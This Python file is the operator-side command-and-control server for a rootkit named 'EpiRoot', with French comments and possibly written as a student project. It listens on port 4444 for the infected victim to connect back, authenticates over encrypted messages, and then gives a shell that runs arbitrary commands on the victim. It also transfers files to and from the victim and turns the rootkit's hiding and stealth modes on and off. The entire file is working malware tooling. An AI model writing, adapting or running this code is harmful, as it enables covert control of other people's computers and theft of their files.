import socket
import readline
import os
import time
from decrypt import send_encrypted, recv_encrypted

HOST = '0.0.0.0'
PORT = 4444
END_MARKER = "END_OUTPUT\n"
DOWNLOAD_MARKER = "DOWNLOAD_START\n"
FILE_END_MARKER = "FILE_END\n"

def read_data_and_marker(connexion):
    """Fonction pour lire les données reçues"""
    buffer = b""
    
    while True:
        try:
            data = recv_encrypted(connexion, 4096)
            if not data:
                break
            
            buffer += data
            
            try:
                buffer_str = buffer.decode(errors='replace')
                
                if END_MARKER in buffer_str:
                    messages = buffer_str.split(END_MARKER)
                    for msg in messages[:-1]:
                        if msg.strip():
                            print(msg.strip())
                    return
            except Exception as e:
                continue
                
        except Exception as e:
            break


def download_file(connexion, local_path):
    """Télécharge un fichier depuis le rootkit"""
    buffer = b""
    file_size = 0
    received_total = 0
    
    while DOWNLOAD_MARKER.encode() not in buffer:
        data = connexion.recv(4096)  
        if not data:
            print("[ERROR] Connection lost during download")
            return
        buffer += data
    
    buffer = buffer.split(DOWNLOAD_MARKER.encode(), 1)[1]
    
    while b"SIZE:" not in buffer or b"\n" not in buffer:
        data = connexion.recv(1024) 
        if not data:
            print("[ERROR] Failed to receive file size")
            return
        buffer += data
    
    size_line, buffer = buffer.split(b"\n", 1)
    if size_line.startswith(b"SIZE:"):
        file_size = int(size_line[5:].decode())
        print(f"[INFO] Downloading file, size: {file_size} bytes")
    
    
    try:
        with open(local_path, 'wb') as f:
            if buffer:
                if FILE_END_MARKER.encode() in buffer:
                    file_data, remaining = buffer.split(FILE_END_MARKER.encode(), 1)
                    f.write(file_data)
                    received_total += len(file_data)
                    buffer = remaining
                else:
                    f.write(buffer)
                    received_total += len(buffer)
                    buffer = b""
            
            while received_total < file_size:
                data = connexion.recv(4096) 
                if not data:
                    break
                
                if FILE_END_MARKER.encode() in data:
                    file_data, remaining = data.split(FILE_END_MARKER.encode(), 1)
                    f.write(file_data)
                    received_total += len(file_data)
                    buffer = remaining
                    break
                else:
                    f.write(data)
                    received_total += len(data)
        
        print(f"[INFO] Download completed: {received_total}/{file_size} bytes")
 
    except Exception as e:
        print(f"[ERROR] Download failed: {e}")

def upload_file(connexion, local_path, remote_path):
    """Upload un fichier vers le rootkit"""
    if not os.path.exists(local_path):
        print(f"[ERROR] Local file '{local_path}' not found")
        return
    
    if not os.path.isfile(local_path):
        print(f"[ERROR] '{local_path}' is not a file")
        return
    
    file_size = os.path.getsize(local_path)
    print(f"[INFO] Uploading '{local_path}' ({file_size} bytes) to '{remote_path}'")
    
    send_encrypted(connexion, f"upload {remote_path}\n")
    
    response_data = recv_encrypted(connexion, 4096)
    response = response_data.decode(errors='replace')
    
    if "Ready to receive" not in response:
        print(f"[ERROR] Rootkit not ready: {response}")
        return
    
    size_message = f"SIZE:{file_size}\n"
    
    connexion.sendall(size_message.encode())
    
    time.sleep(0.1)
    
    try:
        with open(local_path, 'rb') as f:
            sent_total = 0
            while sent_total < file_size:
                chunk = f.read(4096)
                if not chunk:
                    break
                connexion.sendall(chunk)
                sent_total += len(chunk)
        
        print(f"[INFO] Upload completed: {sent_total}/{file_size} bytes")
        
        read_data_and_marker(connexion)
        
    except Exception as e:
        print(f"[ERROR] Upload failed: {e}")

def main():
    """ Fonction principale : attend une connexion, gère l'authentification, puis permet d’exécuter des commandes sur la machine cible"""
    print("Welcome Claire ! You can now hack someone")
    print("=" * 50)
    
    while True:
        try:
            print("Waiting for rootkit connection...")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((HOST, PORT))
            s.listen(1)
            
            connexion, address = s.accept()
            print(f"Connection established from {address[0]}:{address[1]}")
            
            try:
                with connexion:

                    data = connexion.recv(1024)
                    decoded_data = data.decode(errors="replace")
                    print(f"Received: {decoded_data.strip()}")
                    
                    auth_buffer = b""
                    prompt_received = False
                    max_attempts = 15 
                    
                    print("[INFO] Waiting for rootkit authentication prompt...")
                    
                    for retry in range(max_attempts):
                        try:
                            if retry > 0:
                                print(f"       Attempt {retry + 1}/{max_attempts} - please wait...")
                            
                            time.sleep(0.5) 
                            connexion.settimeout(2.0)
                            
                            temp_buffer = b""
                            while True:
                                try:
                                    chunk = connexion.recv(1024)
                                    if not chunk:
                                        break
                                    temp_buffer += chunk
                                    
                                    decoded = temp_buffer.decode(errors='replace')
                                    if "Password:" in decoded:
                                        auth_buffer = temp_buffer
                                        prompt_received = True
                                        break
                                        
                                except socket.timeout:
                                    break
                            
                            connexion.settimeout(None)
                            
                            if prompt_received:
                                print("       Authentication prompt received!")
                                break
                                
                        except Exception as e:
                            print(f"       Network error on attempt {retry + 1}: {e}")
                            continue
                    
                    if not prompt_received:
                        print("[ERROR] Could not establish authentication after multiple attempts.")
                        print("        The rootkit may not be responding properly.")
                        print("        Waiting for a new connection...")
                        continue
                    
                    decoded_auth = auth_buffer.decode(errors='replace')
                    
                    if "Password:" in decoded_auth:
                        # Afficher tout avant "Password:"
                        parts = decoded_auth.split("Password:")
                        if len(parts) > 1:
                            before_password = parts[0]
                            if before_password.strip():
                                print(before_password.strip())
                        print("Password: ", end='', flush=True)
                    else:
                        print(decoded_auth, end='', flush=True)
                    
                    # Authentification
                    authenticated = False
                    for attempt in range(3):
                        try:
                            password = input()
                            
                            send_encrypted(connexion, password + "\n")
                            
                            response = connexion.recv(4096)
                            response_text = response.decode(errors='replace')
                            print(f"Auth: {response_text.strip()}")
                            
                            if "success" in response_text.lower():
                                authenticated = True
                                break
                            elif "too many" in response_text.lower() or "closed" in response_text.lower():
                                break
                            
                            if attempt < 2:
                                try:
                                    time.sleep(0.2)
                                    next_prompt = connexion.recv(1024)
                                    print("Password: ", end='', flush=True)
                                except:
                                    print("Password: ", end='', flush=True)
                        
                        except EOFError:
                            print("\nInput cancelled")
                            break
                        except Exception as e:
                            print(f"Auth error: {e}")
                            break
                    
                    if not authenticated:
                        print("Authentication failed - waiting for new connection")
                        continue

                    # L'utilisateur peut exécuter des commandes sur la machine cible
                    print("\nAuthentication successful!")
                    print("\nAvailable commands:")
                    print("  download <remote_file> <local_file> - Download file from victim")
                    print("  upload <local_file> <remote_file>   - Upload file to victim")
                    print("  hide                                - Hide rootkit module")
                    print("  show                                - Show rootkit module")
                    print("  stealth_on                          - Enable advanced hiding")
                    print("  stealth_off                         - Disable advanced hiding")
                    print("  exit/quit                           - Disconnect and wait for new connection")
                    print("  CTRL+C                              - Shutdown server")
                    print("  <any_command>                       - Execute on victim\n")
                    
                    while True:
                        try:
                            cmd = input("EpiRoot_shell > ")
                            if not cmd:
                                continue
                            if cmd.lower() in ("exit", "quit"):
                                print("Disconnecting from current session...")
                                return
                            
                            # Gérer les commandes spéciales
                            if cmd.startswith("download "):
                                parts = cmd.split()
                                if len(parts) >= 3:
                                    remote_file = parts[1]
                                    local_file = parts[2]
                                    send_encrypted(connexion, f"download {remote_file}\n")
                                    download_file(connexion, local_file)
                                else:
                                    print("ERROR: Usage: download <remote_file> <local_file>")
                            elif cmd.startswith("upload "):
                                parts = cmd.split()
                                if len(parts) >= 3:
                                    local_file = parts[1]
                                    remote_file = parts[2]
                                    upload_file(connexion, local_file, remote_file)
                                else:
                                    print("ERROR: Usage: upload <local_file> <remote_file>")
                            else:
                                send_encrypted(connexion, cmd + "\n")
                                read_data_and_marker(connexion)
                                
                        except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
                            print("\nConnection interrupted by victim")
                            print("Connection lost - waiting for rootkit to reconnect...")
                            break
                        except KeyboardInterrupt:
                            print("\nInterrupted by user")
                            raise
                        except EOFError:
                            print("\nInput stream closed")
                            break
                        except Exception as e:
                            print(f"Communication error: {e}")
                            print("Attempting to continue...")
                            break
            
            except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
                print("Initial connection failed or was dropped")
            except Exception as e:
                print(f"Connection error: {e}")
            finally:
                try:
                    s.close()
                except:
                    pass
                
        except KeyboardInterrupt:
            print("\nShutting down server...")
            break
        except Exception as e:
            print(f"Server error: {e}")
        
        print("Waiting 3 seconds before accepting new connections...\n")
        time.sleep(3)
        

if __name__ == "__main__":
    main()